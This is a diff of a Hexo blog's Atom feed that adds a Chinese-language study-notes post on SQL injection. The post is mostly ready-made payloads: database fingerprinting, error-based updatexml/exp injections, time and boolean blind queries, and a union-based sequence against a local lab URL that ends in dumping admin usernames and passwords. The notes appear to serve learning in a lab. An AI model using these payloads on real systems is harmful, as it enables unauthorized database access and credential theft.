@@ -4,7 +4,7 @@
   
   <link href="/atom.xml" rel="self"/>
   <link href="http://yoursite.com/"/>
-  <updated>2016-10-05T06:49:37.577Z</updated>
+  <updated>2016-10-29T15:13:20.202Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -13,6 +13,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title><![CDATA[sql注入梳理（1）]]></title>
+    <link href="http://yoursite.com/2016/10/27/sql%E6%B3%A8%E5%85%A5%E6%A2%B3%E7%90%86%EF%BC%881%EF%BC%89/"/>
+    <id>http://yoursite.com/2016/10/27/sql注入梳理（1）/</id>
+    <published>2016-10-27T11:53:48.000Z</published>
+    <updated>2016-10-29T15:13:20.202Z</updated>
+    <content type="html"><![CDATA[<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
+<p>报错注入：<br>    有错误回显<br>    select <em> from admin where id=123<br>    select </em> from admin where id=123 and exp(~(select <em>from (select VERSION())a))<br>    select </em> from admin where id=123 and updatexml(1,concat(0x5e,(select user()),0x5e),1)<br>盲注：<br>    time<br>    select * from admin where id =’123’ and (IF((ascii(substr((version()),1,1))=53),sleep(3),sleep(0)))</p>
+<pre><code>bool
+select * from admin where id =&apos;123&apos; and(ascii(substr(version(),1,1))=53)
+
+select * from admin where id =&apos;123&apos; and ascii(substr((version()),1,1))=53
+select * from admin where id =&apos;123&apos; and substr((select flag from flag limit 0,1),1,1)=&apos;f&apos;
+</code></pre><p>union注入：<br>    有回显数据 order by 之前<br>    判断 列数<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=123</a>‘ order by  3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,2,3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,version(),3%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(table_name),3 from  information_schema.tables where table_schema=database()%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(column_name),3 from  information_schema.columns where table_name=0x61646D696E%23<br>    <a href="http://127.0.0.1:8080/exp/sql/where.php?id=-123" target="_blank" rel="external">http://127.0.0.1:8080/exp/sql/where.php?id=-123</a>‘ union select 1,group_concat(username,0x5e,password),3 from  admin%23</p>
+<p>sleep benchmark函数的安全问题<br>判断表 字段<br>快速注入：<br>exists(substr((select flag from flag),1,1)=’f’)</p>
+]]></content>
+    <summary type="html">
+    <![CDATA[<p>判断数据库;<br>    mysql    and length(2)=1  char_length(1)=1<br>    mssql   and len(1)=1  DATALENGTH<br>    oracle and lengthb(1)=1</p>
+<p>报错]]>
+    </summary>
+    
+  </entry>
   
   <entry>
     <title><![CDATA[php随机数函数安全]]></title>
